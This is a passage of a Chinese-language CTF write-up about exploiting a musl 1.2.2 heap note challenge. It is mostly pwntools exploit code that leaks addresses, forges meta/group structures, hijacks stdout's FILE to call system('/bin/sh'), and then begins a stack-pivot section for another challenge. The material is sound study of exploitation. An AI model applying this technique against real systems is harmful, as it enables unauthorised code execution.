&lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;## leak libcbase &amp;amp;&amp;amp; elfbase&#xA;add(0x38,b&amp;#34;a&amp;#34;*0x38,0x38,b&amp;#34;a&amp;#34;*0x38) #防止将整个group归还给堆管理器&#xA;cho(4)&#xA;for _ in range(8):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;2&amp;#34;*0x38,0x28,&amp;#34;2&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;3&amp;#34;*0x38,0x38,&amp;#34;3&amp;#34;*0x38)&#xA;delet(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;for _ in range(6):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;4&amp;#34;*0x38,0x58,&amp;#34;4&amp;#34;*0x58) #一个堆块泄露elfbase，一个libc&#xA;find(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;libcbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0xb7d60 #参考文章中，这里我本地不太对&#xA;libcbase_true=libcbase - 0x2b020 &amp;#43; 0x4000 #调整了一下，我本地这个是对的&#xA;elfbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0x4c40&#xA;lg(&amp;#34;libcbase&amp;#34;)&#xA;lg(&amp;#34;libcbase_true&amp;#34;)&#xA;lg(&amp;#34;elfbase&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;第二步&#34;&gt;&lt;span&gt;第二步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%ba%8c%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;把原本&lt;code&gt;note2&lt;/code&gt;中执行&lt;code&gt;content&lt;/code&gt;的指针改成&lt;code&gt;malloc_context&lt;/code&gt;，&lt;code&gt;show&lt;/code&gt;即可&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# leak secret&#xA;for _ in range(6):&#xA;    find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(malloc_context)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;find(0x28,pd)&#xA;find(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;secret=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;))&#xA;lg(&amp;#34;secret&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;第三步&#34;&gt;&lt;span&gt;第三步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%b8%89%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;此时，能通过修改&lt;code&gt;note2_content&lt;/code&gt;来进行任意地址读和&lt;code&gt;free&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;有了&lt;code&gt;elfbase&lt;/code&gt;、&lt;code&gt;libc_base&lt;/code&gt;、&lt;code&gt;secret&lt;/code&gt;，接下来就是把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上，通过&lt;code&gt;puts&lt;/code&gt;打&lt;code&gt;IO&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上，需要：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在&lt;code&gt;stdout-0x10&lt;/code&gt;伪造一个&lt;code&gt;group&lt;/code&gt;。通过&lt;code&gt;dequeue&lt;/code&gt;，在&lt;code&gt;stdout-0x10&lt;/code&gt;写上&lt;code&gt;fake_group_addr&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;利用&lt;code&gt;queue&lt;/code&gt; 把&lt;code&gt;fake_meta&lt;/code&gt;链入&lt;code&gt;active&lt;/code&gt;链表&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;dequeue&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;触发&lt;code&gt;dequeue&lt;/code&gt;需要&lt;code&gt;fake_meta&lt;/code&gt;的构造：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;通过&lt;code&gt;get_meta()&lt;/code&gt; 所有&lt;code&gt;assert&lt;/code&gt;。包括：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;fake_meta&lt;/code&gt;那个页的起始的&lt;code&gt;secret&lt;/code&gt;要等于&lt;code&gt;malloc_context&lt;/code&gt;的&lt;code&gt;secret&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;fake_meta&lt;/code&gt; 中保存的 &lt;code&gt;group&lt;/code&gt; 指针要正确&lt;/li&gt;&#xA;&lt;li&gt;被&lt;code&gt;free&lt;/code&gt;掉的&lt;code&gt;chunk&lt;/code&gt;的&lt;code&gt;index&lt;/code&gt;小于等于&lt;code&gt;fake_meta-&amp;gt;last_idx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nontrivial_free()&lt;/code&gt; 进入 第一个 if 分支。包括：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;free_able == 1&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;伪造&lt;code&gt;prev&lt;/code&gt;、&lt;code&gt;next&lt;/code&gt;，通过&lt;code&gt;dequeue的unlink&lt;/code&gt;写&lt;code&gt;stdout-0x10&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;然后，通过任意地址&lt;code&gt;free&lt;/code&gt;，&lt;code&gt;free&lt;/code&gt;掉&lt;code&gt;fake_group&lt;/code&gt;的第一个&lt;code&gt;chunk&lt;/code&gt;，执行&lt;code&gt;dequeue&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# set fake meta&#xA;add(0x28,b&amp;#34;5&amp;#34;*0x28,0x1200,&amp;#39;\n&amp;#39;) #0x1200:防止将mmap出来的group归还给堆管理器&#xA;last_idx, freeable, sc, maplen = 0, 1, 8, 1&#xA;#fake meta&#xA;fake_meta = p64(stdout - 0x18)                  # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr &amp;#43; 0x30)         # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0) #对齐&#xA;#fake group&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)                    &#xA;payload = b&amp;#39;a&amp;#39; * 0xaa0 #pad,为了页对齐，让secret在页起始位置&#xA;#fake meta area&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200,payload)&#xA;&#xA;#设置stdout-0x10为fake_group_addr&#xA;# dequeue 2 set stdout_file - 0x10 (where the final fake group)&#xA;for _ in range(3):&#xA;   find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;6&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38) #dequeue&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;queue&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;触发&lt;code&gt;queue&lt;/code&gt;还是需要通过&lt;code&gt;get_meta&lt;/code&gt;的检查，然后就是走&lt;code&gt;nontrivial_free&lt;/code&gt;的&lt;code&gt;else_if&lt;/code&gt;分支：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;freeable == 0&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;这里&lt;code&gt;sc&lt;/code&gt;等于几就是进第几个&lt;code&gt;active&lt;/code&gt;链表，但是需要&lt;code&gt;sc&amp;lt;48&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;# queue 把fake_meta链入active[8]&#xA;# reset fake meta , free fake chunk 2 queue it(queue the fake meta)&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta&#xA;fake_meta = p64(0)                              # prev&#xA;fake_meta &amp;#43;= p64(0)                             # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0)&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)&#xA;payload = b&amp;#39;z&amp;#39; * 0xa90&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;#z()&#xA;find(0x1200, payload)&#xA;for _ in range(2):&#xA;    find(0x28, b&amp;#39;a&amp;#39; * 0x28)&#xA;pd=p64(elfbase&amp;#43;0x5fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;7&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着把&lt;code&gt;fake_meta-&amp;gt;mem&lt;/code&gt;改为&lt;code&gt;stdout-0x10&lt;/code&gt;即可把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上了&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address,checksec=False)&#xA;libc = ELF(&amp;#34;../musl-libc/v1.2.2&amp;#34;)&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;lgaddr  = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;else:&#xA;    # p = process([&amp;#34;/home/j4f/pwn/challs/heap/musl/musl-libc/v1.2.2&amp;#34;,address])&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;&#xA;def cho(num):&#xA;    sla(&amp;#34;option: &amp;#34;,str(num))&#xA; &#xA;&#xA;def add(namesz, name, notesz, note):&#xA;    cho(1)&#xA;    sla(b&amp;#34;name size: &amp;#34;, str(namesz))&#xA;    # sla(b&amp;#34;name: &amp;#34;, name)&#xA;    sa(b&amp;#34;name: &amp;#34;, name)&#xA;    sla(b&amp;#34;note size: &amp;#34;, str(notesz))&#xA;    # sla(b&amp;#34;note content: &amp;#34;, note)&#xA;    sa(b&amp;#34;note content: &amp;#34;, note)&#xA; &#xA;def find(namesz,name):&#xA;    cho(2)&#xA;    sla(&amp;#34;name size: &amp;#34;,str(namesz))&#xA;    # sla(&amp;#34;name: &amp;#34;,name)&#xA;    sa(&amp;#34;name: &amp;#34;,name)&#xA; &#xA;def delet(namesz,name):&#xA;    cho(3)&#xA;    sla(&amp;#34;name size: &amp;#34;,str(namesz))&#xA;    # sla(&amp;#34;name: &amp;#34;,name)&#xA;    sa(&amp;#34;name: &amp;#34;,name)&#xA; &#xA;def remake():&#xA;    cho(4)&#xA;&#xA;## leak libcbase &amp;amp;&amp;amp; elfbase&#xA;add(0x38,b&amp;#34;a&amp;#34;*0x38,0x38,b&amp;#34;a&amp;#34;*0x38) #防止将整个group归还给堆管理器&#xA;cho(4)&#xA;for _ in range(8):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;2&amp;#34;*0x38,0x28,&amp;#34;2&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;3&amp;#34;*0x38,0x38,&amp;#34;3&amp;#34;*0x38)&#xA;delet(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;for _ in range(6):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;4&amp;#34;*0x38,0x58,&amp;#34;4&amp;#34;*0x58) #一个堆块泄露elfbase，一个libc&#xA;find(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;libcbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0xb7d60 #这里不太对&#xA;libcbase_true=libcbase - 0x2b020 &amp;#43; 0x4000 #调整了一下&#xA;elfbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0x4c40&#xA;lg(&amp;#34;libcbase&amp;#34;)&#xA;lg(&amp;#34;libcbase_true&amp;#34;)&#xA;lg(&amp;#34;elfbase&amp;#34;)&#xA;&#xA;# calculate important addr&#xA;malloc_context = libcbase &amp;#43; 0xb4ac0&#xA;# mmap_base = libcbase - 0xa000&#xA;mmap_base = libcbase_true - 0x4000&#xA;fake_meta_addr = mmap_base &amp;#43; 0x2010&#xA;fake_mem_addr = mmap_base &amp;#43; 0x2040&#xA;# stdout = libcbase &amp;#43; 0xb4280   &#xA;stdout = libcbase_true &amp;#43; 0xdb2c0 &#xA;lg(&amp;#34;malloc_context&amp;#34;)&#xA;lg(&amp;#34;mmap_base&amp;#34;)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&#xA;lg(&amp;#34;fake_mem_addr&amp;#34;)&#xA;lg(&amp;#34;stdout&amp;#34;)&#xA;&#xA;# leak secret&#xA;for _ in range(6):&#xA;    find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(malloc_context)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;find(0x28,pd)&#xA;find(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;secret=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;))&#xA;lg(&amp;#34;secret&amp;#34;)&#xA;&#xA;# set fake meta&#xA;add(0x28,b&amp;#34;5&amp;#34;*0x28,0x1200,&amp;#39;\n&amp;#39;) #0x1200:防止将mmap出来的group归还给堆管理器&#xA;last_idx, freeable, sc, maplen = 0, 1, 8, 1&#xA;#fake meta&#xA;fake_meta = p64(stdout - 0x18)                  # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr &amp;#43; 0x30)         # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0) #对齐&#xA;#fake group&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)                    &#xA;payload = b&amp;#39;a&amp;#39; * 0xaa0 #pad,为了页对齐，让secret在页起始位置&#xA;#fake meta area&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200,payload)&#xA;&#xA;#设置stdout-0x10为fake_group_addr&#xA;# dequeue 2 set stdout_file - 0x10 (where the final fake group)&#xA;for _ in range(3):&#xA;   find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;6&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38) #dequeue&#xA;&#xA;# queue 把fake_meta链入active[8]&#xA;# reset fake meta , free fake chunk 2 queue it(queue the fake meta)&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta&#xA;fake_meta = p64(0)                              # prev&#xA;fake_meta &amp;#43;= p64(0)                             # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0)&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)&#xA;payload = b&amp;#39;z&amp;#39; * 0xa90&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;#z()&#xA;find(0x1200, payload)&#xA;for _ in range(2):&#xA;    find(0x28, b&amp;#39;a&amp;#39; * 0x28)&#xA;pd=p64(elfbase&amp;#43;0x5fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;7&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&#xA;&#xA;## reset fake meta&amp;#39;s group at stdout_file -0x10&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0&#xA;fake_meta = p64(fake_meta_addr)                 # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr)                # next&#xA;fake_meta &amp;#43;= p64(stdout - 0x10)                 # mem&#xA;fake_meta &amp;#43;= p32(1) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= b&amp;#39;a&amp;#39; * 0x18&#xA;fake_meta &amp;#43;= p64(stdout - 0x10)&#xA;payload = b&amp;#39;y&amp;#39; * 0xa80&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200, payload)&#xA;&#xA;# calloc to edit stdout 2 IO_attack&#xA;cho(1)&#xA;sla(&amp;#39;name size: &amp;#39;, str(0x28))&#xA;sa(&amp;#39;name: &amp;#39;, &amp;#39;\n&amp;#39;)&#xA;sla(&amp;#39;note size: &amp;#39;, str(0x80))#sc为8&#xA;fake_IO  = b&amp;#39;/bin/sh\x00&amp;#39;                       # flags&#xA;fake_IO &amp;#43;= p64(0)                               # rpos&#xA;fake_IO &amp;#43;= p64(0)                               # rend&#xA;fake_IO &amp;#43;= p64(libcbase &amp;#43; 0x5c9a0)              # close&#xA;fake_IO &amp;#43;= p64(1)                               # wend&#xA;fake_IO &amp;#43;= p64(0)                               # wpos&#xA;fake_IO &amp;#43;= p64(0)                               # mustbezero_1&#xA;fake_IO &amp;#43;= p64(0)                               # wbase&#xA;fake_IO &amp;#43;= p64(0)                               # read&#xA;fake_IO &amp;#43;= p64(libcbase_true &amp;#43; libc.sym[&amp;#39;system&amp;#39;])  # write&#xA;##z()&#xA;sl(fake_IO)&#xA;&#xA;&#xA;&#xA;itr()&#xA;# find bbase 0x1685&#xA;# bbase 0x178c&#xA;# bbase 0x1798&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;hkcertctf2025-_-compress&#34;&gt;&lt;span&gt;hkcertCTF2025 _ compress&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#hkcertctf2025-_-compress&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;musl v1.1.24&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;有个&lt;code&gt;gadget&lt;/code&gt;可以进行栈迁移：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/20i 0x49503&amp;#43;0x7ffff7c00000&#xA;   0x7ffff7c49503 &amp;lt;longjmp&amp;#43;11&amp;gt;: mov    rbx,QWORD PTR [rdi]&#xA;   0x7ffff7c49506 &amp;lt;longjmp&amp;#43;14&amp;gt;: mov    rbp,QWORD PTR [rdi&amp;#43;0x8]&#xA;   0x7ffff7c4950a &amp;lt;longjmp&amp;#43;18&amp;gt;: mov    r12,QWORD PTR [rdi&amp;#43;0x10]&#xA;   0x7ffff7c4950e &amp;lt;longjmp&amp;#43;22&amp;gt;: mov    r13,QWORD PTR [rdi&amp;#43;0x18]&#xA;   0x7ffff7c49512 &amp;lt;longjmp&amp;#43;26&amp;gt;: mov    r14,QWORD PTR [rdi&amp;#43;0x20]&#xA;   0x7ffff7c49516 &amp;lt;longjmp&amp;#43;30&amp;gt;: mov    r15,QWORD PTR [rdi&amp;#43;0x28]&#xA;   0x7ffff7c4951a &amp;lt;longjmp&amp;#43;34&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x30]&#xA;   0x7ffff7c4951e &amp;lt;longjmp&amp;#43;38&amp;gt;: mov    rsp,rdx&#xA;=&amp;gt; 